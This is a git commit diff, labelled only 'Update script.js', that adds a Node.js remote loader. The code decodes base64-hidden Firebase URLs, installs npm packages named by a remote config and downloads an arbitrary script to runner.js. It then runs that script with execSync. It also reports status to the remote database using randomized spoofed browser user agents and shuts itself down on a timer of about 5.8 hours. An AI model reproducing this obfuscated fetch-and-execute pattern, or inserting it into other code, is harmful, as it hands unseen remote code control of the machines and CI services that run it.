34593a2f89f6de8a2c1fd222da5badbc02ce36dc
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2025-11-05 19:26:56 +0600

    Update script.js

--- script.js
+++ script.js
@@ -1,29 +1,99 @@
+const fs = require('fs')
 const tls = require('tls')
+const { execSync } = require('child_process')
 
-const url = new URL('wss://s-usc1b-nss-2159.firebaseio.com/.ws?v=5&r=f&ns=founder-v1-default-rtdb');
+const windowsTokens = [
+    'Windows NT 10.0; Win64; x64',
+    'Windows NT 10.0; Win64; x86',
+    'Windows NT 10.0; WOW64',
+    'Windows NT 10.0; Win64',
+    'Windows NT 10.0; x64; rv:99.0',
+    'Windows 11; Win64; x64',
+    'Windows NT 10.0; Win64; x64; Windows 11',
+    'Windows 11; WOW64; Win64',
+    'Windows 11; x64; rv:100.0'
+]
 
-let host = url.hostname
-let port = 443
-let path = url.pathname + url.search
 let id = 1
+let DATABASE = null
+let CONNECTION = null
+let USER = getUserName()
+let FINISH = new Date().getTime()+21000000
 
-let socket = tls.connect({ host, port, servername: host }, () => {
+startServer()
 
-    socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\n\r\n`);
 
-    sendMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/Process","d":{"t":{".sv":"timestamp"}, "s":1}}}}))
-    sendMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/Process","d":{"t":{".sv":"timestamp"}, "s":0}}}}))
-})
+setInterval(async () => {
+    await checkStatus()
+}, 300000)
 
-socket.on('data', (data) => {
-    console.log('Received:', data.toString())
-})
+async function startServer() {
+    console.log('Node: ---START-SERVER---')
 
-socket.on('end', () => console.log('Disconnected'))
-socket.on('error', (err) => socket.destroy())
+    let module = await onModuleDetails()
+    if (!module) {
+        console.log('---PROCESS-CLOSE---')
+        process.exit(0)
+    }
 
-function sendMessage(socket, message) {
+    await checkStatus()
+    
+    await runDynamicServer(module)
+}
+
+async function onModuleDetails() {
     try {
+        let data = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L3J1bm5pbmcv')+USER+'.json')
+
+        if (data && data.module) {
+            let database = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2RhdGFiYXNlLw==')+data.database+'.json')
+            
+            if (database) {
+                DATABASE = getQueryParam(database, 'ns')
+                await runWebSocket(new URL(database))
+            }
+
+            let module = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L21vZHVsZS8=')+data.module+'.json')
+            
+            if (module) {
+                return module
+            }
+        }
+    } catch (error) {}
+
+    return null
+}
+
+async function runWebSocket(url) {
+    let host = url.hostname
+    let port = 443
+    let path = url.pathname + url.search
+
+    let socket = tls.connect({ host, port, servername: host }, () => {
+        socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\nUser-Agent: ${randomUserAgent()}\r\n\r\n`);
+        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
+        CONNECTION = socket
+    })
+    
+    socket.on('end', () => {
+        CONNECTION = null
+        setTimeout(async () => {
+            await runWebSocket(url)
+        }, 3000)
+    })
+
+    socket.on('error', (err) => {
+        CONNECTION = null
+        socket.destroy()
+    })
+}
+
+function sendWSMessage(socket, message) {
+    try {
+        if (!socket || socket.destroyed) {
+            return false
+        }
+
         let payload = Buffer.from(message, 'utf8')
         let frame = Buffer.alloc(2 + 4 + payload.length)
         frame[0] = 0x81
@@ -38,14 +108,143 @@ function sendMessage(socket, message) {
         }
 
         socket.write(frame)
+        
         return true
     } catch (error) {
-        console.log(error)
-        
         return false
     }
 }
 
+
+async function checkStatus() {
+    if (FINISH > 0 && FINISH < new Date().getTime()) {
+        
+        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))) {
+            try {
+                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":0 }, {
+                    'Content-Type': 'application/json'
+                })
+            } catch (error) {}
+        }
+
+        console.log('---COMPLETED---')
+        process.exit(0)
+    } else {
+        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))) {
+            try {
+                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":1 }, {
+                    'Content-Type': 'application/json'
+                })
+            } catch (error) {}
+        }
+    }
+}
+
+async function runDynamicServer(data) {
+    try {
+        const packages = data.install.split(' ')
+        const missingPackages = []
+
+        for (let pkg of packages) {
+            try {
+                require.resolve(pkg)
+            } catch {
+                missingPackages.push(pkg)
+            }
+        }
+
+        if (missingPackages.length > 0) {
+            console.log('Node: ---INSTALLING-PACKAGE---')
+            execSync(`npm install ${missingPackages.join(" ")}`)
+            console.log('Node: ---INSTALLATION-SUCCESS---')
+        }
+
+        let fileExists = fs.existsSync('runner.js')
+
+        if (!fileExists) {
+            console.log('Node: ---DOWNLOADING-SCRIPT---')
+            let script = await getAxios(data.script)
+
+            if (script) {
+                fs.writeFileSync('runner.js', script, 'utf8')
+                console.log('Node: ---SCRIPT-DOWNLOAD-COMPLETE---')
+            } else {
+                console.log('Node: ---SCRIPT-DOWNLOAD-FAILED---')
+            }
+        } else {
+            console.log('Node: ---SCRIPT-FOUND---')
+        }
+
+        console.log('Node: ---RUNNING-SCRIPT---')
+        execSync(`node runner.js`, { stdio: 'inherit' })
+    } catch (error) {
+        console.log(error);
+        
+        console.log('Node: ---SCRIPT-RUNNING-ERROR---')
+    }
+}
+
+
+async function getAxios(url, options = {}) {
+    try {
+        const response = await fetch(url, options)
+        if (!response.ok) return null
+
+        const contentType = response.headers.get('content-type')
+        if (contentType && contentType.includes('application/json')) {
+            return await response.json()
+        } else {
+            return await response.text()
+        }
+    } catch (err) {
+        return null
+    }
+}
+
+async function patchFetch(url, data, headers = {}) {
+    try {
+        let res = await fetch(url, {
+            method: 'PATCH',
+            headers: { ...headers },
+            body: JSON.stringify(data)
+        })
+
+        let json = await res.json()
+        return json
+    } catch (err) {
+        throw null
+    }
+}
+
+function getQueryParam(url, param) {
+    let match = url.match(new RegExp(`[?&]${param}=([^&]+)`))
+    return match ? match[1] : null
+}
+
+
+function getUserName() {
+    try {
+        let directory = __dirname.split('\\')
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
+            if (name) {
+                return name
+            }
+        }
+    } catch (error) {}
+
+    try {
+        let directory = __dirname.split('/')
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
+            if (name) {
+                return name
+            }
+        }
+    } catch (error) {}
+
+    return null
+}
 
 function randomWebSocketKey() {
     let arr = []
@@ -54,4 +253,25 @@ function randomWebSocketKey() {
     }
     let binary = String.fromCharCode(...arr)
     return Buffer.from(binary, 'binary').toString('base64')
+}
+
+function randInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function randomUserAgent() {
+    let os = windowsTokens[randInt(0, windowsTokens.length - 1)]
+    let major = randInt(112, 141)
+    let chromeVer = `${major}.0.0.0`
+    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`
+}
+
+function decode(data) {
+    return Buffer.from(data, 'base64').toString('utf-8')
+}
+
+function delay(time) {
+    return new Promise(function(resolve) {
+        setTimeout(resolve, time)
+    })
 }
